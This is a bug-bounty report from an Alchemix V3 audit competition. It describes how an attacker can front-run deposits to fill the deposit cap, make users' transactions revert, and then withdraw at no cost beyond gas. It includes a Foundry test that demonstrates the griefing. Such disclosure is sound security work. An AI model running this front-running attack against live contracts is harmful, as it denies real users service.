# 57606 sc insight attacker can dos deposits by hitting the deposit cap

**Submitted on Oct 27th 2025 at 14:57:03 UTC by @PotEater for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57606
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**

## Description

## Brief/Intro

The function `deposit` implements a check that ensures the amount user is trying to deposit does not exceed the deposit cap.

However, the withdraw mechanism does not enforce any fees or lockdowns. Meaning attacker can front-run deposits, depositing huge amount and hitting the deposit cap, causing legitimate txs to revert by the depositCap check. The attacker can then immediately withdraw and repeat the process.

## Vulnerability Details

The function `deposit` implements the following check:

```solidity
_checkState(_mytSharesDeposited + amount <= depositCap);
```

This check ensures the amount does not exceed the depositCap. However, on `withdraw` there are no fees or lockdowns, meaning a malicious actor can front-run transactions, hitting the deposit cap, making legitimate txs revert and withdraw immediately after that, discouraging users from interacting with this protocol.

This is a direct griefing. The attack cost is low as the only price for the attacker are the gas fees.

## Impact Details

This is a direct griefing attack, users transactions will fail unexpectedly. This would discourage users from interacting with this protocol.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L369>

## Proof of Concept

## Proof of Concept

Add this function in the `AlchemistV3.t.sol` test file:

This PoC demonstrates how the attacker front-runs a user, making user tx fail and then withdraws his funds immediately after that, preparing for another front-run.

PoC:

```solidity
function test_legendary_poc() external {
    // Set deposit cap on the Alchemist (not on the Transmuter)
    vm.prank(alOwner); // admin of the Alchemist proxy
    alchemist.setDepositCap(100e18);

    // Verify new cap
    uint256 amount = alchemist.depositCap(); // 100e18

    // ---- [BEEF deposits up to cap + buffer] ----
    vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
    alchemist.deposit(amount, address(0xbeef), 0);
    vm.stopPrank();

    // ---- [DEAD tries to deposit and fails due to cap] ----
    uint256 amount2 = 10e18;
    vm.startPrank(address(0xdead));
    SafeERC20.safeApprove(address(vault), address(alchemist), amount2);
    vm.expectRevert();
    alchemist.deposit(amount2, address(0xdead), 0);
    vm.stopPrank();

    // ---- [BEEF withdraws successfully] ----
    vm.startPrank(address(0xbeef));
    uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
    alchemist.withdraw(amount, address(0xbeef), tokenId);
    vm.stopPrank();
}
```

I set the cap to low amount for testing purposes.
